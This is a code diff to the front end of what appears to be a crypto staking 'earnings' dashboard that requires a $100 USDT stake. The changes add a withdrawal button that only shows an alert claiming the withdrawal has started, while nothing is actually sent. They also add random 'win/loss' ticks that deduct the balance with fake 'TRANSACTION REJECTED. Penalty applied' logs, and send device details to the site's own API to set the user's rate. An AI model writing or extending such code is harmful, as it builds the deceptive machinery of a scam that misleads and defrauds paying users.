@@ -99,6 +99,9 @@
                 <p style="font-weight: 600;" id="next-withdrawal">-</p>
                 <p style="color: var(--text-muted); font-size: 0.75rem; margin-top: 0.5rem;">Withdrawals processed on
                     1st & 15th of the month. Min $100 USDT stake must remain.</p>
+                <button id="withdraw-btn" class="btn-primary"
+                    style="width: 100%; margin-top: 1rem; font-size: 0.9rem; padding: 0.6rem;">Initiate
+                    Withdrawal</button>
             </div>
         </div>
     </div>
@@ -161,6 +164,7 @@
     const terminalSection = document.getElementById('terminal-section');
     const terminalOutput = document.getElementById('terminal-output');
     const terminalTimerText = document.getElementById('terminal-timer');
+    const withdrawBtn = document.getElementById('withdraw-btn');
 
     let currentUser = null;
     let ethBalance = 0;
@@ -223,7 +227,28 @@
             trainingTimeSeconds = data.trainingTimeSeconds || 0;
             hourlyRateUSD = data.lastHourlyRate || 8.50;
 
-            updateBalanceDisplay();
+            // Auto-Check Device on refresh/login if they have a history
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                cores: navigator.hardwareConcurrency || "Unknown",
+                memory: navigator.deviceMemory || "Unknown"
+            };
+
+            // Perform background check
+            fetch('/api/detect-device', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(deviceInfo)
+            }).then(res => res.json()).then(newData => {
+                if (newData.device_assessment !== data.deviceDetails) {
+                    // Update if device changed physically
+                    db.collection("users").doc(currentUser.uid).set({
+                        deviceDetails: newData.device_assessment,
+                        lastHourlyRate: newData.hourly_rate
+                    }, { merge: true });
+                    hourlyRateUSD = newData.hourly_rate; // override loaded
+                }
+            }).catch(e => console.error("Auto detect failed", e));
 
             const usdtEquivalent = ethBalance * ETH_PRICE;
             if (data.stakePaid || usdtEquivalent >= 100) {
@@ -241,6 +266,19 @@
                 }
             }
         }
+    }
+
+    // Withdraw Logic
+    if (withdrawBtn) {
+        withdrawBtn.addEventListener('click', () => {
+            const date = new Date();
+            const day = date.getDate();
+            if (day === 1 || day === 15) {
+                alert("Withdrawal initiated! Your request is being processed. It may take up to 24 hours to clear on the Ethereum network.");
+            } else {
+                alert("Withdrawal Denied: Withdrawals are only processed on the 1st and 15th of every month. Please wait until the designated payout window.");
+            }
+        });
     }
 
     async function saveUserData() {
@@ -364,15 +402,38 @@
         const usdPerSecond = (hourlyRateUSD / 3600);
         const ethPerSecond = usdPerSecond / ETH_PRICE;
 
-        // Visual Logs & Earnings Loop (every 2 seconds fetch a log)
+        // Visual Logs & Earnings Loop (every second, logic applies per tick)
         mainLoopInterval = setInterval(() => {
             trainingTimeSeconds += 1;
-            ethBalance += ethPerSecond;
+
+            // Random chance of win vs loss based on 50-75% win rate
+            // 65% base win rate
+            const isWin = Math.random() < 0.65;
+
+            if (isWin) {
+                // Successful Validation
+                ethBalance += ethPerSecond;
+                if (trainingTimeSeconds % 3 === 0) {
+                    appendLog();
+                }
+            } else {
+                // Failed Validation - deduct the standard tick amount
+                ethBalance -= ethPerSecond;
+                // Cannot drop below zero
+                if (ethBalance < 0) ethBalance = 0;
+
+                if (trainingTimeSeconds % 3 === 0) {
+                    const line = document.createElement('div');
+                    line.className = 'terminal-line';
+                    line.style.color = '#ef4444'; // Red error font
+                    line.innerText = `[${formatTime(trainingTimeSeconds)}] TRANSACTION REJECTED. Validation failed. Penalty applied.`;
+                    terminalOutput.appendChild(line);
+                    terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                }
+            }
+
             updateBalanceDisplay();
 
-            if (trainingTimeSeconds % 3 === 0) {
-                appendLog();
-            }
             if (trainingTimeSeconds % 10 === 0) {
                 saveUserData(); // backup every 10 seconds
             }
